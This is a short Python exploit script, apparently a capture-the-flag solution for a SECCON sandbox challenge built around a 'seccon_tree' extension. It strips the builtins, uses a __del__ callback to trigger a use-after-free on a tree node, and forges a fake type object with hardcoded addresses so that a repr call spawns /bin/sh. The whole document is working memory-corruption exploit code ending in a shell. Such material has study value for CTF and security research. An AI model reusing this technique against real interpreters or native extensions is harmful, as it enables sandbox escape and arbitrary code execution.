from seccon_tree import Tree

# Debug utility
seccon_print = print
seccon_bytes = bytes
seccon_id = id
seccon_range = range
seccon_hex = hex
seccon_bytearray = bytearray
class seccon_util(object):
    def Print(self, *l):
        seccon_print(*l)
    def Bytes(self, o):
        return seccon_bytes(o)
    def Id(self, o):
        return seccon_id(o)
    def Range(self, *l):
        return seccon_range(*l)
    def Hex(self, o):
        return seccon_hex(o)
    def Bytearray(self, o):
        return seccon_bytearray(o)

dbg = seccon_util()

# Disallow everything
for key in dir(__builtins__):
    del __builtins__.__dict__[key]
del __builtins__

###################################
bytearray = dbg.Bytearray
print = dbg.Print
id = dbg.Id
hex = dbg.Hex

l = []
a = Tree('A')

def p64(x):
    return x.to_bytes(8, 'little')

def _del(x):
    l.append(a.get_child_left())

A = "a".__class__.__class__("A", (), {"__del__": _del})

a.add_child_left(Tree(A()))
a.add_child_left(Tree('X'))

print(l[0])
b = bytearray(40)

x = p64(0xc)
x += p64(0x956900)      # PyType_Type
x += p64(0)
x += p64(0)
x += p64(0x28)          # sizeof(Tree)
x += p64(0) * 6
x += p64(0x4214f0)      # tp_repr

print('x: '+hex(id(x)))
print('b: '+hex(id(b)))

b[0:8] = b'-bin/sh\0'       # PyObject->ob_refcnt
                            # '-' + 2 = '/'
b[8:16] = p64(id(x)+0x20)   # PyObject->ob_type = PyByteArrayObject->ob_bytes
print(l[0])     # triger repr

# b[0:8] = b'/bin/sh\0'       # PyObject->ob_refcnt
# print(l)
